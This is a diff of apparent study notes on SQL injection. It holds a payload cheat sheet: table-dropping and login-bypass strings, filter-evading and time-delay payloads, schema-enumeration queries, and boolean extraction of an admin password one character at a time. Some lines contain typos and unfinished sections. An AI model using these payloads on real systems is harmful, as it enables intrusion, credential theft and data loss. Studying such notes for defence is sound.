@@ -18,59 +18,110 @@
 
 [Home](../README.md)
 
-Todo
-- Example of an SQL injection with better explanation
-
 # SQL Injection(SQLi)
-SQL injection allows an attacker to make unrequested queries or modifications to the database.
+SQL injection allows an attacker to make unwanted requested queries or modifications to the database.
 
-Let's assume the server makes this query with user input. `SELECT * FROM users WHERE = 'user_input';`
+Let's assume the server makes this query with user input. `SELECT * FROM users WHERE = 'userInput';`
 
 If the user were to input `' OR 1=1; DROP TABLE users; --` the resulting query would be `SELECT * FROM users WHERE = '' OR 1=1; DROP TABLE users; -- ';`.
 
-This allows the user to write any SQL to the db. Everything after the `--` is commented out so the request doesn't error out.
+This attack allowed the user to drop the table when it should be allowed.
+- `'` ended the user input's string
+- `OR 1=1;` allowed the previous query to return true
+- `--` commented the following `'` that was there from the server's query
+	- Comments could sometime be `#`
 
-Sometimes `#` can be used as comments instead of `--`
+## Table of Contents
+<!-- TOC -->
 
-When sending request over the URL you can use `%20` as spaces.
+- [SQL InjectionSQLi](#sql-injectionsqli)
+	- [Table of Contents](#table-of-contents)
+	- [Common SQLi attacks](#common-sqli-attacks)
+		- [Logins](#logins)
+	- [How do you know the website is using SQL?](#how-do-you-know-the-website-is-using-sql)
+	- [How do you know which SQL database is being used?](#how-do-you-know-which-sql-database-is-being-used)
+	- [How do you know what all the tables are in the db?](#how-do-you-know-what-all-the-tables-are-in-the-db)
+	- [How do you know what all the columns in a table are?](#how-do-you-know-what-all-the-columns-in-a-table-are)
+	- [Types of SQLi](#types-of-sqli)
+		- [Boolean based SQLi](#boolean-based-sqli)
+		- [Blind SQLi](#blind-sqli)
+	- [How to prevent SQLis](#how-to-prevent-sqlis)
 
-## Test is the db vulnerable to SQLi
+<!-- /TOC -->
+
+## [Common SQLi attacks](#table-of-contents)
+- `' OR 1=1; YOUR INJECTION HERE; --`
+- `' UNION SELECT column FROM table; --`
+	- When getting back a query you sometimes need an exact amount of columns. Use `, 1` to get this.
+		- Ex: `' UNION SELECT column, 1, 1 FROM table; --` 3 columns
+
+- `0'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z`
+	- Possibly bypasses filters
+
+### [Logins](#table-of-contents)
+Bypassing logins
+- `SELECT id FROM users WHERE password = '' AND username = ''` or `SELECT id FROM users WHERE username = '' AND password = ''`
+	- Whichever is first, username input or password input: `' OR 1=1; --`
+
+`admin'--`
+`administrator'--`
+
+## [How do you know the website is using SQL?](#table-of-contents)
 - Look for SQL keywords in source code which may tell you what they are using.
 - Input single quote `'` and look for errors
 - Input some SQL and see how that changes the responses. Ex: `ASCII(97)`
-- Look at the response differences between `' OR 1=1; --` and `' OR 1=2; --`
+	- How does this work?
 
-Blind SQL injection are sql injections where the attacker cannot see any responses(including errors) from the database.
+## [How do you know which SQL database is being used?](#table-of-contents)
+- MySQL: `SELECT VERSION();`
+- Postgres: `SELECT version();`
+- SQL Server: `SELECT @@VERSION;`
+- Oracle: `SELECT * FROM v$version`
+- SQLite: `SELECT sqlite_version();`
+	- https://www.techonthenet.com/sqlite/sys_tables/index.php
+- IBM Db2: `SELECT * FROM sysibm.sysversions;`
 
-To solve this you can use
-- Payloads designed to trigger time delays. Ex: `'; WAITFOR DELAY ('0:0:20');--` or `SELECT SLEEP(20);--`
-- Out-of-bound network interactions
-	- The attacker injects SQL which triggers the database to communicate with the attacker's server.
+## [How do you know what all the tables are in the db?](#table-of-contents)
+- MySQL: `SHOW TABLES;`
+- Postgres, SQL Server: `SELECT * FROM information_schema.tables`
+- Oracle: `SELECT table_name FROM user_tables;`
+- SQLite: `SELECT name FROM sqlite_master;`
+- IBM Db2: `SELECT tabname FROM syscat.tables'`
 
-## List of good SQL attacks
-- `' UNION SELECT username, password FROM users; --`
-- `' OR 1=1; YOUR INJECTION HERE; --`
-- Use XOR to prevent filters
-	- Ex: `0'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z`
-- On a login page
-	- `admin'--` or `administrator'--` for the username
-- Get the version of the database
-	- MySQL: `SELECT VERSION();`
-	- Postgres: `SELECT version();`
-	- SQL Server: `SELECT @@VERSION;`
-	- Oracle: `SELECT * FROM v$version`
-	- SQLite: `SELECT sqlite_version();`
-	- IBM Db2: `SELECT * FROM sysibm.sysversions;`
-- Get all tables
-	- MySQL: `SHOW TABLES;`
-	- Postgres, SQL Server: `SELECT * FROM information_schema.tables`
-	- Oracle: `SELECT table_name FROM user_tables;`
-	- SQLite: `SELECT name FROM sqlite_master WHERE type='table';`
-	- IBM Db2: `SELECT tabname FROM syscat.tables'`
-- Get all columns in a table
-	- MySQL and Oracle: `DESCRIBE table_name;` or `SHOW COLUMNS FROM table_name;`
-	- Postgres, SQL Server: `SELECT COLUMN_NAME from information_schema.columns where table_name = 'table_name'`
-	- SQLite doesn't have this feature.
-	- IBM Db2: `SELECT colname FROM syscat.columns WHERE tabname = 'table_name';`
+## [How do you know what all the columns in a table are?](#table-of-contents)
+- MySQL and Oracle: `DESCRIBE table_name;` or `SHOW COLUMNS FROM table_name;`
+- Postgres, SQL Server: `SELECT COLUMN_NAME from information_schema.columns where table_name = 'table_name'`
+- SQLite doesn't have this feature.
+- IBM Db2: `SELECT colname FROM syscat.columns WHERE tabname = 'table_name';`
 
-## Solution
+## [Types of SQLi](#table-of-contents)
+
+### [Boolean based SQLi](#table-of-contents)
+Boolean based SQLi happen when you only get a boolean value back from your SQLi and you have to extract information through this boolean value.
+- Determine if it is a boolean based SQLi
+	- The output from `' OR 1=1; --` is different from `' OR 1=2; --`
+
+- `AND (SELECT 'a' FROM users WHEN username='admin')='a'; -- `
+	- Returns 'a' when there is a admin username. Which returns true.
+	- Used to find if there is that username in users
+- `AND (SELECT substring(password,1,1) FROM users WHERE username='admin')='a'; --`
+	- used to extract the password one character at a time from the admin user
+	- Next time 'a' will be changed to 'b' etc
+	- substring(column, index, length)
+	- Used to guess and check one character at a time for the password
+	- Useful when you are getting back boolean information, but need to reconstruct a string
+
+- Look at the response differences between 
+
+### [Blind SQLi](#table-of-contents)
+Blind SQLi are where the attacker cannot see any responses, including errors, from the db.
+
+- Time based attacks
+	- Payloads designed to trigger time delays. Ex: `'; WAITFOR DELAY ('0:0:20');--` or `SELECT SLEEP(20);--`
+- Out-of-bound network interactions - the attacker injects SQL which triggers the database to communicate with the attacker's server.
+
+## [How to prevent SQLis](#table-of-contents)
+- 
+
+`SELECT * FROM products WHERE category = 'Gitfs' OR 1=1 --'`
+	- Selects products which has the category of gifts or where 1=1(which is true). This results in returning all the products regardless of the category.
